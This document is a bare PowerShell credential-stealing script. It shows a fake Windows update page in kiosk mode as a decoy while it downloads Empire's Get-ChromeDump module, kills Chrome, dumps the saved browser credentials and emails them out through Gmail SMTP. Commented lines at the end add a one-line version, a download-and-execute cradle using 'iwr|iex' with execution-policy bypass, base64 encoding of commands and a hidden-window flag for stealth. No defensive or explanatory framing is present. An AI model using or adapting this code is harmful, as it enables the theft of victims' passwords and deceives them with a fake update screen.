start-job -scriptblock {C:\Progra~1\Intern~1\iexplore.exe -k http://fakeupdate.net/win10u/index.html} 1>$null
$url = "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1"
$output = "$env:temp\file.psm1"
$Username = "your email ";
$Password = "your password";
$path = "C:\Users\win10\AppData\Local\Temp\dumped.txt";
(New-Object System.Net.WebClient).DownloadFile($url,$output)
if(Get-Process -Name Chrome -ea SilentlyContinue)
{
Stop-Process -Force -Name Chrome
}
Import-Module $env:temp\file.psm1
Get-ChromeDump -OutFile $env:temp\dumped.txt  3>$null


function Send-ToEmail([string]$email, [string]$attachmentpath){

    $message = new-object Net.Mail.MailMessage;
    $message.From = "YourName@gmail.com";
    $message.To.Add($email);
    $message.Subject = "subject text here...";
    $message.Body = "body text here...";
    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
    $message.Attachments.Add($attachment);

    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
    $smtp.EnableSSL = $true;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.send($message);
    $attachment.Dispose();
 }
Send-ToEmail  -email "to-address-email" -attachmentpath $path 2>$null;
Start-Sleep -Seconds 10
Get-Process -Name iexplore | Stop-Process



#---------One Liner-------#
#(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1","$env:temp\file.ps1");Import-Module $env:temp\file.ps1;Get-ChromeDump -OutFile $env:temp\dumped.txt 3>$null

#powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"


#[convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command))

#Powershell .\download.ps1 -windowstyle hidden  - use this to hide the window
